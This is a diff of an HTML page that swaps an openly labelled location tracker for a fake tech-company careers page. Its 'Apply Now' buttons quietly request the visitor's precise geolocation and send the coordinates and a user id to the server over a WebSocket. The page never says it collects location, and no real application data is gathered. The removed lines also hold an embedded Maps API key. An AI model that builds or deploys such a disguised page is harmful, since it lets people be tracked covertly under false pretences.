@@ -4,47 +4,69 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Tracker</title>
+    <title>TechInnovate - Career Opportunities</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/uuid/8.3.2/uuid.min.js"></script>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
-        }
-
-        #status {
-            margin: 20px 0;
-            font-weight: bold;
-        }
-
-        #map {
-            height: 300px;
-            width: 100%;
-            max-width: 600px;
-            margin: 20px auto;
-        }
-
-        #locationButton {
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-    </style>
+    <script src="https://cdn.tailwindcss.com"></script>
 </head>
 
-<body>
-    <h1>Location Tracker</h1>
-    <div id="status">Click the button to start tracking your location</div>
-    <button id="locationButton">Start Location Tracking</button>
-    <div id="map"></div>
+<body class="bg-gray-100 font-sans">
+    <header class="bg-indigo-600 text-white">
+        <nav class="container mx-auto px-6 py-3 flex justify-between items-center">
+            <div class="text-2xl font-bold">TechInnovate</div>
+            <div>
+                <a href="#" class="text-white hover:text-indigo-200">Home</a>
+                <a href="#" class="ml-4 text-white hover:text-indigo-200">About</a>
+                <a href="#" class="ml-4 text-white hover:text-indigo-200">Contact</a>
+            </div>
+        </nav>
+        <div class="container mx-auto px-6 py-16 text-center">
+            <h1 class="text-4xl font-bold mb-2">Join Our Innovative Team</h1>
+            <p class="text-xl">Shape the future of technology with us</p>
+        </div>
+    </header>
+
+    <main class="container mx-auto px-6 py-8">
+        <h2 class="text-3xl font-bold mb-6 text-center">Current Openings</h2>
+        <div class="grid md:grid-cols-2 gap-6">
+            <div class="bg-white rounded-lg shadow-md p-6">
+                <h3 class="text-2xl font-semibold mb-2">Full Stack Developer</h3>
+                <p class="text-gray-600 mb-4">We're looking for a talented Full Stack Developer to join our innovative
+                    team. You'll be working on cutting-edge projects using the latest technologies.</p>
+                <ul class="list-disc list-inside mb-4 text-gray-600">
+                    <li>5+ years of experience with modern web technologies</li>
+                    <li>Proficiency in React, Node.js, and SQL/NoSQL databases</li>
+                    <li>Strong problem-solving skills and attention to detail</li>
+                </ul>
+                <button onclick="applyForJob('Full Stack Developer')"
+                    class="bg-indigo-600 text-white py-2 px-4 rounded hover:bg-indigo-700 transition duration-300">Apply
+                    Now</button>
+            </div>
+            <div class="bg-white rounded-lg shadow-md p-6">
+                <h3 class="text-2xl font-semibold mb-2">UX Designer</h3>
+                <p class="text-gray-600 mb-4">Join our design team to create intuitive and beautiful user experiences
+                    that delight our customers and drive product success.</p>
+                <ul class="list-disc list-inside mb-4 text-gray-600">
+                    <li>3+ years of UX design experience</li>
+                    <li>Proficiency in Figma, Sketch, and Adobe Creative Suite</li>
+                    <li>Strong portfolio demonstrating user-centered design process</li>
+                </ul>
+                <button onclick="applyForJob('UX Designer')"
+                    class="bg-indigo-600 text-white py-2 px-4 rounded hover:bg-indigo-700 transition duration-300">Apply
+                    Now</button>
+            </div>
+        </div>
+        <div id="applicationStatus" class="mt-8 text-center font-semibold text-lg"></div>
+    </main>
+
+    <footer class="bg-gray-800 text-white py-6">
+        <div class="container mx-auto px-6 text-center">
+            <p>&copy; 2024 TechInnovate. All rights reserved.</p>
+        </div>
+    </footer>
 
     <script>
         const userId = uuid.v4();
         let ws;
-        let watchId;
-        const statusDiv = document.getElementById('status');
-        const locationButton = document.getElementById('locationButton');
 
         function initWebSocket() {
             const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
@@ -58,77 +80,33 @@
             ws.onerror = (error) => console.error('WebSocket error:', error);
         }
 
-        function sendLocation(position) {
-            const { latitude, longitude } = position.coords;
-            statusDiv.textContent = `Location: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
-            if (ws && ws.readyState === WebSocket.OPEN) {
-                ws.send(JSON.stringify({ type: 'location', userId, latitude, longitude }));
-            }
-            updateMap(latitude, longitude);
-        }
-
-        function handleError(error) {
-            console.error('Geolocation error:', error);
-            switch (error.code) {
-                case error.PERMISSION_DENIED:
-                    statusDiv.textContent = "Location permission denied. Please enable location services and reload the page.";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    statusDiv.textContent = "Location information is unavailable.";
-                    break;
-                case error.TIMEOUT:
-                    statusDiv.textContent = "The request to get location timed out.";
-                    break;
-                default:
-                    statusDiv.textContent = "An unknown error occurred while getting location.";
-                    break;
-            }
-            locationButton.textContent = "Retry Location Tracking";
-            locationButton.disabled = false;
-        }
-
-        function updateMap(lat, lng) {
-            const mapDiv = document.getElementById('map');
-            mapDiv.innerHTML = `<img src="https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lng}&zoom=13&size=600x300&maptype=roadmap&markers=color:red%7C${lat},${lng}&key=AIzaSyAOAdBvliNx-HbE8Ta3L0C6SPj7ehvn-JU" alt="Map">`;
-        }
-
-        function startLocationTracking() {
+        function applyForJob(jobTitle) {
             if ("geolocation" in navigator) {
-                statusDiv.textContent = "Requesting location permission...";
-                locationButton.disabled = true;
-                watchId = navigator.geolocation.watchPosition(sendLocation, handleError, {
-                    enableHighAccuracy: true,
-                    timeout: 5000,
-                    maximumAge: 0
-                });
-                locationButton.textContent = "Stop Location Tracking";
-                locationButton.onclick = stopLocationTracking;
+                document.getElementById('applicationStatus').textContent = "Applying your application...";
+                navigator.geolocation.getCurrentPosition(
+                    (position) => sendApplication(jobTitle, position),
+                    (error) => {
+                        console.error('Geolocation error:', error);
+                        document.getElementById('applicationStatus').textContent = "Unable to get location. Please ensure location services are enabled and try again.";
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
             } else {
-                statusDiv.textContent = "Geolocation is not supported by this browser.";
+                document.getElementById('applicationStatus').textContent = "Geolocation is not supported by this browser.";
             }
         }
 
-        function stopLocationTracking() {
-            if (watchId !== undefined) {
-                navigator.geolocation.clearWatch(watchId);
-                watchId = undefined;
+        function sendApplication(jobTitle, position) {
+            const { latitude, longitude } = position.coords;
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({ type: 'application', userId, jobTitle, latitude, longitude }));
+                document.getElementById('applicationStatus').textContent = `Application for ${jobTitle} submitted successfully!`;
+            } else {
+                document.getElementById('applicationStatus').textContent = "Unable to submit application. Please try again later.";
             }
-            statusDiv.textContent = "Location tracking stopped";
-            locationButton.textContent = "Start Location Tracking";
-            locationButton.onclick = startLocationTracking;
         }
 
         initWebSocket();
-        locationButton.onclick = startLocationTracking;
-
-        window.addEventListener('beforeunload', () => {
-            if (watchId !== undefined) {
-                navigator.geolocation.clearWatch(watchId);
-            }
-            if (ws) {
-                ws.close();
-            }
-        });
     </script>
 </body>
 
